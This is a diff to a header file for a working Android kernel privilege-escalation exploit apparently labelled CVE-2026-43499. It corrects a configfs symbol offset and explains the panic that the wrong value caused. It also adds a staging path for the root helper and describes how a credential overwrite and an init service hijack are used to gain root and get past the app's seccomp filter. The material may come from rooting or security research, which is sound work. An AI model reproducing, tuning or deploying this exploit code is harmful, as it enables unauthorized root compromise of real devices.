@@ -146,7 +146,29 @@
 #define SECURITY_HOOK_HEADS_OFF 0x0168e2f0ULL
 #define KMALLOC_CACHES_OFF     0x0168de30ULL
 #define ANON_PIPE_BUF_OPS_OFF  0x0117f188ULL
-#define CONFIGFS_READ_ITER_OFF      0x0049fc10ULL
+/* The *plain* configfs_read_iter, not configfs_bin_read_iter. The read
+ * primitive plants buffer->page and clears needs_read_fill, which is the plain
+ * one's contract; the bin one copies from bin_buffer/bin_buffer_size, which
+ * that blob leaves at zero, and reaches to_frag(file) unconditionally at +0x3c
+ * -- above its own mutex_lock -- through a dentry whose d_fsdata is a tmpfs
+ * directory index rather than a configfs_dirent.
+ *
+ * Which symbol is which was read out of this image's own tables:
+ *
+ *   configfs_file_operations     @ image 0x118a4c0  read_iter 0x0049f8ec
+ *   configfs_bin_file_operations @ image 0x118a5c8  read_iter 0x0049fc10
+ *
+ * and the bin address is what a run with it panicked at, to the byte:
+ * configfs_bin_read_iter+0x3c faulting on 0x96, i.e. index 70 + the 0x50 that
+ * is offsetof(struct configfs_dirent, s_frag).
+ *
+ * This is the one value here that a fresh extraction disagrees with, and the
+ * disagreement is the extractor's: pmg110-root's tools/extract_device.py maps
+ * this field to the symbol named configfs_bin_read_iter. Re-derive the rest of
+ * this header from the image freely -- all 57 struct offsets and the other 26
+ * symbols were checked against one on 2026-07-30 and agree -- but do not take
+ * this one from it. */
+#define CONFIGFS_READ_ITER_OFF      0x0049f8ecULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049fe18ULL
 #define COPY_SPLICE_READ_OFF   0x004235e0ULL
 #define NOOP_LLSEEK_OFF        0x003d6340ULL
@@ -349,9 +371,28 @@
 #define CRED_COPY_OFF 0x1080
 
 
+/* Where the bootstrap helper is staged for an adb-shell run. The application
+ * passes its own copy down instead, through CVE43499_ROOT_HELPER, because the
+ * APK's copy is at a path that is neither fixed nor writable from here. This
+ * is the route run_exploit() takes: its credential write roots a forked child,
+ * and that child execs the helper itself.
+ *
+ * From an application that child carries the app's seccomp filter, so
+ * root_helper.c has init exec the helper instead, over one service's argv. Its
+ * INIT_HIJACK_* defaults are what this device ships -- read out of the init.rc
+ * in system.img, not assumed from the static assert, which only says the
+ * defaults are self-consistent:
+ *
+ *     service snapuserd_proxy /system/bin/snapuserd -socket-handoff
+ *         oneshot / disabled / user root / seclabel u:r:snapuserd:s0
+ *
+ * A core66 device whose init.rc differs has to say so here. */
+#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"
+
 /* usermodehelper root route -- taken from this repository's own profile,
  * because root.c stays RMG's: the kernel execs the app's helper as root and
- * that helper is what serves -c and --late-load. */
+ * that helper is what serves -c and --late-load. Only the fops/pipe route
+ * reaches it, which run_exploit() does not use on this core. */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0f00ULL
 #define SYSTEM_UNBOUND_WQ_OFF 0x0212b320ULL
